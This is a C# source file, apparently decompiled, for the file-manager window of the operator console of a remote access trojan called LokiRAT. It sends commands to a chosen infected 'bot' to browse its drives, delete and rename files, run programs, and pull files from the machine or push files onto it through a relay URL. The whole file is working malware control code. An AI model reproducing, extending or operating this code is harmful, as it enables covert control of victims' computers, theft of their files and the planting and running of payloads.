namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class fileManager : Form
    {
        private ToolStripMenuItem addNewFolderToolStripMenuItem;
        private Button button1;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader4;
        private ColumnHeader columnHeader5;
        private ColumnHeader columnHeader6;
        private ColumnHeader columnHeader7;
        private ComboBox comboBox1;
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private ContextMenuStrip contextMenuStrip2;
        private ToolStripMenuItem copyPathToolStripMenuItem;
        private ToolStripMenuItem copyPathToolStripMenuItem1;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem2;
        private ToolStripMenuItem downloadToolStripMenuItem1;
        private ToolStripMenuItem executeToolStripMenuItem;
        private string fileDownloadUrl;
        private string fileUploadFilename;
        private ImageList imageList1;
        private Label label1;
        private Label label2;
        private ToolStripMenuItem listFilesToolStripMenuItem;
        private ListView listView1;
        private ListView listView2;
        private ListView listView3;
        private string myLastCommand;
        private ToolStripMenuItem newFolderToolStripMenuItem;
        private OpenFileDialog openFileDialog1;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem1;
        private ToolStripMenuItem renameToolStripMenuItem;
        private ToolStripMenuItem renameToolStripMenuItem1;
        private ToolStripMenuItem renameToolStripMenuItem2;
        private ToolStripMenuItem renameToolStripMenuItem3;
        private SaveFileDialog saveFileDialog1;
        private TabControl tabControl1;
        private TabPage tabPage1;
        private TabPage tabPage2;
        private TextBox textBox1;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripSeparator toolStripSeparator3;
        private ToolStripTextBox toolStripTextBox1;
        private ToolStripTextBox toolStripTextBox2;
        private ToolStripTextBox toolStripTextBox3;
        private TreeView treeView1;
        private ToolStripMenuItem uploadToolStripMenuItem1;
        private WebClient wc = new WebClient();
        private WebClient wcu = new WebClient();

        public fileManager()
        {
            this.InitializeComponent();
            this.InstalizeWB();
        }

        private void addNewFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=creatdir|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.toolStripTextBox1.Text + "/");
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.treeView1.Nodes.Clear();
            TreeNode node = new TreeNode(this.comboBox1.Text);
            this.treeView1.Nodes.Add(node);
        }

        private void copyPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(this.treeView1.SelectedNode.FullPath);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void deleteToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                main.sendToHost("type=command&command=delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("You must select file first!", "Select file | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void downloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                main.sendToHost("type=command&command=upload|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("You must select file first!", "Select file | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                main.sendToHost("type=command&command=run|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("You must select file first!", "Select file | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void fileManager_Load(object sender, EventArgs e)
        {
            this.myLastCommand = "-1";
            this.treeView1.Nodes.Clear();
            TreeNode node = new TreeNode(this.comboBox1.Text);
            this.treeView1.Nodes.Add(node);
        }

        public int genImageFile(string filename)
        {
            string[] strArray = new string[0x63];
            strArray = filename.Split(new char[] { '.' });
            switch (strArray[strArray.Length - 1])
            {
                case "png":
                case "jpg":
                case "gif":
                    return 2;

                case "exe":
                    return 3;

                case "pdf":
                    return 4;

                case "txt":
                    return 5;

                case "zip":
                    return 6;

                case "rar":
                    return 7;

                case "ini":
                    return 8;

                case "avi":
                case "mkv":
                case "3gp":
                    return 9;

                case "mp3":
                case "wma":
                    return 10;
            }
            return 1;
        }

        public string genSize(string bytes)
        {
            decimal num = Convert.ToDecimal(bytes);
            if (num < 1024M)
            {
                return (num.ToString() + " Bytes");
            }
            if ((num >= 1024M) && (num < 1048576M))
            {
                return (Math.Round((decimal) (num / 1024M), 2).ToString() + " KB");
            }
            if ((num >= 1048576M) && (num < 1073741824M))
            {
                return (Math.Round((decimal) ((num / 1024M) / 1024M), 2).ToString() + " MB");
            }
            return (Math.Round((decimal) (((num / 1024M) / 1024M) / 1024M), 2).ToString() + " GB");
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(fileManager));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.treeView1 = new TreeView();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.deleteToolStripMenuItem = new ToolStripMenuItem();
            this.renameToolStripMenuItem1 = new ToolStripMenuItem();
            this.toolStripTextBox2 = new ToolStripTextBox();
            this.renameToolStripMenuItem2 = new ToolStripMenuItem();
            this.toolStripSeparator3 = new ToolStripSeparator();
            this.listFilesToolStripMenuItem = new ToolStripMenuItem();
            this.copyPathToolStripMenuItem = new ToolStripMenuItem();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.imageList1 = new ImageList(this.components);
            this.comboBox1 = new ComboBox();
            this.listView1 = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.contextMenuStrip2 = new ContextMenuStrip(this.components);
            this.newFolderToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripTextBox1 = new ToolStripTextBox();
            this.addNewFolderToolStripMenuItem = new ToolStripMenuItem();
            this.renameToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripTextBox3 = new ToolStripTextBox();
            this.renameToolStripMenuItem3 = new ToolStripMenuItem();
            this.deleteToolStripMenuItem2 = new ToolStripMenuItem();
            this.toolStripSeparator2 = new ToolStripSeparator();
            this.executeToolStripMenuItem = new ToolStripMenuItem();
            this.downloadToolStripMenuItem1 = new ToolStripMenuItem();
            this.uploadToolStripMenuItem1 = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.copyPathToolStripMenuItem1 = new ToolStripMenuItem();
            this.refreshToolStripMenuItem1 = new ToolStripMenuItem();
            this.label1 = new Label();
            this.textBox1 = new TextBox();
            this.label2 = new Label();
            this.button1 = new Button();
            this.saveFileDialog1 = new SaveFileDialog();
            this.openFileDialog1 = new OpenFileDialog();
            this.tabControl1 = new TabControl();
            this.tabPage1 = new TabPage();
            this.listView3 = new ListView();
            this.columnHeader6 = new ColumnHeader();
            this.columnHeader7 = new ColumnHeader();
            this.tabPage2 = new TabPage();
            this.listView2 = new ListView();
            this.columnHeader4 = new ColumnHeader();
            this.columnHeader5 = new ColumnHeader();
            this.contextMenuStrip1.SuspendLayout();
            this.contextMenuStrip2.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            base.SuspendLayout();
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            this.treeView1.Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.treeView1.ContextMenuStrip = this.contextMenuStrip1;
            this.treeView1.ImageIndex = 0;
            this.treeView1.ImageList = this.imageList1;
            this.treeView1.Location = new Point(-2, 0x21);
            this.treeView1.Name = "treeView1";
            this.treeView1.SelectedImageIndex = 0;
            this.treeView1.Size = new Size(0xd6, 0x13d);
            this.treeView1.TabIndex = 0;
            this.treeView1.AfterSelect += new TreeViewEventHandler(this.treeView1_AfterSelect);
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.deleteToolStripMenuItem, this.renameToolStripMenuItem1, this.toolStripSeparator3, this.listFilesToolStripMenuItem, this.copyPathToolStripMenuItem, this.refreshToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(130, 120);
            this.deleteToolStripMenuItem.Image = (Image) manager.GetObject("deleteToolStripMenuItem.Image");
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new Size(0x81, 0x16);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new EventHandler(this.deleteToolStripMenuItem_Click);
            this.renameToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { this.toolStripTextBox2, this.renameToolStripMenuItem2 });
            this.renameToolStripMenuItem1.Image = (Image) manager.GetObject("renameToolStripMenuItem1.Image");
            this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
            this.renameToolStripMenuItem1.Size = new Size(0x81, 0x16);
            this.renameToolStripMenuItem1.Text = "Rename";
            this.renameToolStripMenuItem1.Click += new EventHandler(this.renameToolStripMenuItem1_Click);
            this.toolStripTextBox2.Name = "toolStripTextBox2";
            this.toolStripTextBox2.Size = new Size(100, 0x17);
            this.renameToolStripMenuItem2.Image = (Image) manager.GetObject("renameToolStripMenuItem2.Image");
            this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
            this.renameToolStripMenuItem2.Size = new Size(160, 0x16);
            this.renameToolStripMenuItem2.Text = "Rename";
            this.renameToolStripMenuItem2.Click += new EventHandler(this.renameToolStripMenuItem2_Click);
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new Size(0x7e, 6);
            this.listFilesToolStripMenuItem.Image = (Image) manager.GetObject("listFilesToolStripMenuItem.Image");
            this.listFilesToolStripMenuItem.Name = "listFilesToolStripMenuItem";
            this.listFilesToolStripMenuItem.Size = new Size(0x81, 0x16);
            this.listFilesToolStripMenuItem.Text = "List Files";
            this.listFilesToolStripMenuItem.Click += new EventHandler(this.listFilesToolStripMenuItem_Click);
            this.copyPathToolStripMenuItem.Image = (Image) manager.GetObject("copyPathToolStripMenuItem.Image");
            this.copyPathToolStripMenuItem.Name = "copyPathToolStripMenuItem";
            this.copyPathToolStripMenuItem.Size = new Size(0x81, 0x16);
            this.copyPathToolStripMenuItem.Text = "Copy Path";
            this.copyPathToolStripMenuItem.Click += new EventHandler(this.copyPathToolStripMenuItem_Click);
            this.refreshToolStripMenuItem.Image = (Image) manager.GetObject("refreshToolStripMenuItem.Image");
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(0x81, 0x16);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
            this.imageList1.ImageStream = (ImageListStreamer) manager.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "folder.png");
            this.imageList1.Images.SetKeyName(1, "unknown.png");
            this.imageList1.Images.SetKeyName(2, "image-gallery.png");
            this.imageList1.Images.SetKeyName(3, "App.png");
            this.imageList1.Images.SetKeyName(4, "ico_pdf.png");
            this.imageList1.Images.SetKeyName(5, "page_white_text.png");
            this.imageList1.Images.SetKeyName(6, "110916_27832_16_archive_zip_icon.png");
            this.imageList1.Images.SetKeyName(7, "rar.png");
            this.imageList1.Images.SetKeyName(8, "ini.png");
            this.imageList1.Images.SetKeyName(9, "avi.png");
            this.imageList1.Images.SetKeyName(10, "music.gif");
            this.comboBox1.Items.AddRange(new object[] { "C:", "D:", "G:", "F:" });
            this.comboBox1.Location = new Point(0x45, 7);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new Size(0x2e, 0x15);
            this.comboBox1.TabIndex = 1;
            this.comboBox1.Text = "C:";
            this.comboBox1.SelectedIndexChanged += new EventHandler(this.comboBox1_SelectedIndexChanged);
            this.listView1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.listView1.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2, this.columnHeader3 });
            this.listView1.ContextMenuStrip = this.contextMenuStrip2;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new Point(0xda, 0x21);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new Size(0x2aa, 0x13d);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 2;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.listView1.SelectedIndexChanged += new EventHandler(this.listView1_SelectedIndexChanged);
            this.columnHeader1.Text = "File Name";
            this.columnHeader1.Width = 0xc2;
            this.columnHeader2.Text = "File Size";
            this.columnHeader2.Width = 0x88;
            this.columnHeader3.Text = "Last Edit";
            this.columnHeader3.Width = 0x9d;
            this.contextMenuStrip2.Items.AddRange(new ToolStripItem[] { this.newFolderToolStripMenuItem, this.renameToolStripMenuItem, this.deleteToolStripMenuItem2, this.toolStripSeparator2, this.executeToolStripMenuItem, this.downloadToolStripMenuItem1, this.uploadToolStripMenuItem1, this.toolStripSeparator1, this.copyPathToolStripMenuItem1, this.refreshToolStripMenuItem1 });
            this.contextMenuStrip2.Name = "contextMenuStrip2";
            this.contextMenuStrip2.Size = new Size(0x87, 0xc0);
            this.newFolderToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.toolStripTextBox1, this.addNewFolderToolStripMenuItem });
            this.newFolderToolStripMenuItem.Image = (Image) manager.GetObject("newFolderToolStripMenuItem.Image");
            this.newFolderToolStripMenuItem.Name = "newFolderToolStripMenuItem";
            this.newFolderToolStripMenuItem.Size = new Size(0x86, 0x16);
            this.newFolderToolStripMenuItem.Text = "New Folder";
            this.toolStripTextBox1.Name = "toolStripTextBox1";
            this.toolStripTextBox1.Size = new Size(100, 0x17);
            this.toolStripTextBox1.Text = "New Folder";
            this.addNewFolderToolStripMenuItem.Image = (Image) manager.GetObject("addNewFolderToolStripMenuItem.Image");
            this.addNewFolderToolStripMenuItem.Name = "addNewFolderToolStripMenuItem";
            this.addNewFolderToolStripMenuItem.Size = new Size(160, 0x16);
            this.addNewFolderToolStripMenuItem.Text = "Add New Folder";
            this.addNewFolderToolStripMenuItem.Click += new EventHandler(this.addNewFolderToolStripMenuItem_Click);
            this.renameToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.toolStripTextBox3, this.renameToolStripMenuItem3 });
            this.renameToolStripMenuItem.Image = (Image) manager.GetObject("renameToolStripMenuItem.Image");
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new Size(0x86, 0x16);
            this.renameToolStripMenuItem.Text = "Rename";
            this.toolStripTextBox3.Name = "toolStripTextBox3";
            this.toolStripTextBox3.Size = new Size(100, 0x17);
            this.renameToolStripMenuItem3.Image = (Image) manager.GetObject("renameToolStripMenuItem3.Image");
            this.renameToolStripMenuItem3.Name = "renameToolStripMenuItem3";
            this.renameToolStripMenuItem3.Size = new Size(160, 0x16);
            this.renameToolStripMenuItem3.Text = "Rename";
            this.renameToolStripMenuItem3.Click += new EventHandler(this.renameToolStripMenuItem3_Click);
            this.deleteToolStripMenuItem2.Image = (Image) manager.GetObject("deleteToolStripMenuItem2.Image");
            this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
            this.deleteToolStripMenuItem2.Size = new Size(0x86, 0x16);
            this.deleteToolStripMenuItem2.Text = "Delete";
            this.deleteToolStripMenuItem2.Click += new EventHandler(this.deleteToolStripMenuItem2_Click);
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new Size(0x83, 6);
            this.executeToolStripMenuItem.Image = (Image) manager.GetObject("executeToolStripMenuItem.Image");
            this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
            this.executeToolStripMenuItem.Size = new Size(0x86, 0x16);
            this.executeToolStripMenuItem.Text = "Execute";
            this.executeToolStripMenuItem.Click += new EventHandler(this.executeToolStripMenuItem_Click);
            this.downloadToolStripMenuItem1.Image = (Image) manager.GetObject("downloadToolStripMenuItem1.Image");
            this.downloadToolStripMenuItem1.Name = "downloadToolStripMenuItem1";
            this.downloadToolStripMenuItem1.Size = new Size(0x86, 0x16);
            this.downloadToolStripMenuItem1.Text = "Download";
            this.downloadToolStripMenuItem1.Click += new EventHandler(this.downloadToolStripMenuItem1_Click);
            this.uploadToolStripMenuItem1.Image = (Image) manager.GetObject("uploadToolStripMenuItem1.Image");
            this.uploadToolStripMenuItem1.Name = "uploadToolStripMenuItem1";
            this.uploadToolStripMenuItem1.Size = new Size(0x86, 0x16);
            this.uploadToolStripMenuItem1.Text = "Upload";
            this.uploadToolStripMenuItem1.Click += new EventHandler(this.uploadToolStripMenuItem1_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0x83, 6);
            this.copyPathToolStripMenuItem1.Image = (Image) manager.GetObject("copyPathToolStripMenuItem1.Image");
            this.copyPathToolStripMenuItem1.Name = "copyPathToolStripMenuItem1";
            this.copyPathToolStripMenuItem1.Size = new Size(0x86, 0x16);
            this.copyPathToolStripMenuItem1.Text = "Copy Path";
            this.refreshToolStripMenuItem1.Image = (Image) manager.GetObject("refreshToolStripMenuItem1.Image");
            this.refreshToolStripMenuItem1.Name = "refreshToolStripMenuItem1";
            this.refreshToolStripMenuItem1.Size = new Size(0x86, 0x16);
            this.refreshToolStripMenuItem1.Text = "Refresh";
            this.refreshToolStripMenuItem1.Click += new EventHandler(this.refreshToolStripMenuItem1_Click);
            this.label1.AutoSize = true;
            this.label1.Location = new Point(9, 10);
            this.label1.Name = "label1";
            this.label1.Size = new Size(60, 13);
            this.label1.TabIndex = 7;
            this.label1.Text = "Local Disc:";
            this.textBox1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
            this.textBox1.Location = new Point(0xda, 7);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x260, 20);
            this.textBox1.TabIndex = 10;
            this.label2.AutoSize = true;
            this.label2.Location = new Point(0x90, 10);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x45, 13);
            this.label2.TabIndex = 12;
            this.label2.Text = "Current Path:";
            this.button1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.button1.Location = new Point(0x340, 5);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x40, 0x16);
            this.button1.TabIndex = 13;
            this.button1.Text = "Open";
            this.button1.UseVisualStyleBackColor = true;
            this.saveFileDialog1.FileOk += new CancelEventHandler(this.saveFileDialog1_FileOk);
            this.openFileDialog1.FileOk += new CancelEventHandler(this.openFileDialog1_FileOk);
            this.tabControl1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new Point(1, 0x161);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new Size(0x383, 0x8d);
            this.tabControl1.TabIndex = 14;
            this.tabPage1.Controls.Add(this.listView3);
            this.tabPage1.Location = new Point(4, 0x16);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new Padding(3);
            this.tabPage1.Size = new Size(0x37b, 0x73);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Download";
            this.tabPage1.UseVisualStyleBackColor = true;
            this.listView3.Columns.AddRange(new ColumnHeader[] { this.columnHeader6, this.columnHeader7 });
            this.listView3.ContextMenuStrip = this.contextMenuStrip2;
            this.listView3.Dock = DockStyle.Fill;
            this.listView3.FullRowSelect = true;
            this.listView3.GridLines = true;
            this.listView3.HideSelection = false;
            this.listView3.Location = new Point(3, 3);
            this.listView3.MultiSelect = false;
            this.listView3.Name = "listView3";
            this.listView3.ShowGroups = false;
            this.listView3.Size = new Size(0x375, 0x6d);
            this.listView3.SmallImageList = this.imageList1;
            this.listView3.TabIndex = 4;
            this.listView3.UseCompatibleStateImageBehavior = false;
            this.listView3.View = View.Details;
            this.columnHeader6.Text = "From";
            this.columnHeader6.Width = 0x14b;
            this.columnHeader7.Text = "To";
            this.columnHeader7.Width = 370;
            this.tabPage2.Controls.Add(this.listView2);
            this.tabPage2.Location = new Point(4, 0x16);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new Padding(3);
            this.tabPage2.Size = new Size(0x37b, 0x73);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Upload";
            this.tabPage2.UseVisualStyleBackColor = true;
            this.listView2.Columns.AddRange(new ColumnHeader[] { this.columnHeader4, this.columnHeader5 });
            this.listView2.ContextMenuStrip = this.contextMenuStrip2;
            this.listView2.Dock = DockStyle.Fill;
            this.listView2.FullRowSelect = true;
            this.listView2.GridLines = true;
            this.listView2.HideSelection = false;
            this.listView2.Location = new Point(3, 3);
            this.listView2.MultiSelect = false;
            this.listView2.Name = "listView2";
            this.listView2.ShowGroups = false;
            this.listView2.Size = new Size(0x2c1, 0x63);
            this.listView2.SmallImageList = this.imageList1;
            this.listView2.TabIndex = 3;
            this.listView2.UseCompatibleStateImageBehavior = false;
            this.listView2.View = View.Details;
            this.columnHeader4.Text = "From";
            this.columnHeader4.Width = 0x14b;
            this.columnHeader5.Text = "To";
            this.columnHeader5.Width = 370;
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x386, 0x1ee);
            base.Controls.Add(this.tabControl1);
            base.Controls.Add(this.listView1);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.comboBox1);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.treeView1);
            base.Controls.Add(this.button1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "fileManager";
            this.Text = "File Manager | LokiRAT";
            base.Load += new EventHandler(this.fileManager_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.contextMenuStrip2.ResumeLayout(false);
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage2.ResumeLayout(false);
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void InstalizeWB()
        {
            this.wc.DownloadFileCompleted += new AsyncCompletedEventHandler(this.wc_Completed);
        }

        private void listFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                this.toolStripTextBox3.Text = this.listView1.SelectedItems[0].Text;
            }
            catch
            {
            }
        }

        public TreeNode makeNode(string text)
        {
            return new TreeNode(text);
        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            this.fileUploadFilename = this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/";
            this.wcu.UploadFile(main.connectionURL + "?id=" + main.currentID + "&type=upload&filename=" + this.openFileDialog1.FileName.Substring(this.openFileDialog1.FileName.LastIndexOf(@"\") + 1), "POST", this.openFileDialog1.FileName);
            this.listView2.Items.Add(this.fileUploadFilename).SubItems.Add(this.fileDownloadUrl);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void renameToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void renameToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=rename|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/|" + this.treeView1.SelectedNode.FullPath.Substring(0, this.treeView1.SelectedNode.FullPath.LastIndexOf(@"\")).Replace(@"\", "/") + "/" + this.toolStripTextBox2.Text);
        }

        private void renameToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=rename|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text + "|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.toolStripTextBox3.Text);
        }

        private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            Uri address = new Uri(this.fileDownloadUrl);
            this.wc.DownloadFileAsync(address, this.saveFileDialog1.FileName);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            string[] strArray2 = new string[1];
            string[] strArray3 = new string[0x3e7];
            string[] strArray4 = new string[0x3e7];
            string str = main.lastCommandText[main.selectedBot];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    if (str.Substring(0, 6) == "LSlist")
                    {
                        int num;
                        this.myLastCommand = main.lastCommand[main.selectedBot];
                        this.treeView1.SelectedNode.Nodes.Clear();
                        strArray2 = Regex.Split(main.lastCommandText[main.selectedBot], "{-fbr}");
                        strArray4 = Regex.Split(strArray2[0], "{-f}");
                        strArray3 = Regex.Split(strArray2[1], "{-f}");
                        for (num = 1; num < (strArray4.Length - 1); num++)
                        {
                            this.treeView1.SelectedNode.Nodes.Add(this.makeNode(strArray4[num]));
                        }
                        this.listView1.Items.Clear();
                        for (num = 0; num < (strArray3.Length - 1); num++)
                        {
                            strArray = Regex.Split(strArray3[num], "{-fi}");
                            ListViewItem item = this.listView1.Items.Add(strArray[0]);
                            item.ImageIndex = this.genImageFile(strArray[0]);
                            item.SubItems.Add(this.genSize(strArray[1]));
                            item.SubItems.Add(strArray[2]);
                        }
                    }
                    else if ((((str.Substring(0, 8) == "RSdelete") || (str.Substring(0, 10) == "RScreatdir")) || (str.Substring(0, 10) == "RSdownload")) || (str.Substring(0, 8) == "RSrename"))
                    {
                        main.sendToHost("type=command&command=list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
                    }
                    else
                    {
                        string[] strArray5;
                        if (main.lastCommandText[main.selectedBot].Substring(0, 9) == "RSdupload")
                        {
                            strArray5 = new string[2];
                            strArray5 = Regex.Split(main.lastCommandText[main.selectedBot], "{-s}");
                            main.sendToHost("type=command&command=download|" + main.connectionURL.Substring(0, main.connectionURL.LastIndexOf("/") + 1) + strArray5[1] + "|" + this.fileUploadFilename + strArray5[1].Substring(strArray5[1].LastIndexOf("/") + 1));
                            this.listView2.Items.Add(main.connectionURL.Substring(0, main.connectionURL.LastIndexOf("/") + 1) + strArray5[1]).SubItems.Add(this.fileUploadFilename);
                        }
                        else if (main.lastCommandText[main.selectedBot].Substring(0, 5) == "ufile")
                        {
                            this.fileUploadFilename = this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/";
                            strArray5 = new string[0x63];
                            strArray2 = Regex.Split(main.lastCommandText[main.selectedBot], "{-s}");
                            this.fileDownloadUrl = main.connectionURL.Substring(0, main.connectionURL.LastIndexOf("/")) + "/" + strArray2[1];
                            strArray5 = strArray2[1].Substring(strArray2[1].LastIndexOf("/") + 1).Split(new char[] { '.' });
                            this.listView3.Items.Add(this.fileUploadFilename).SubItems.Add(this.fileDownloadUrl);
                            this.saveFileDialog1.FileName = strArray2[1].Substring(strArray2[1].LastIndexOf("/") + 1);
                            this.saveFileDialog1.Filter = "Supported Files|*." + strArray5[strArray5.Length - 1] + "|All Files|*.*";
                            this.saveFileDialog1.ShowDialog();
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            this.listView1.Items.Clear();
            this.textBox1.Text = this.treeView1.SelectedNode.FullPath + @"\";
            main.sendToHost("type=command&command=list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
            try
            {
                this.toolStripTextBox2.Text = this.treeView1.SelectedNode.FullPath.Substring(this.treeView1.SelectedNode.FullPath.LastIndexOf(@"\") + 1);
            }
            catch
            {
            }
        }

        private void uploadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.openFileDialog1.ShowDialog();
        }

        private void wc_Completed(object sender, AsyncCompletedEventArgs e)
        {
            this.listView3.Items.Add(this.fileDownloadUrl).SubItems.Add(this.saveFileDialog1.FileName);
        }
    }
}

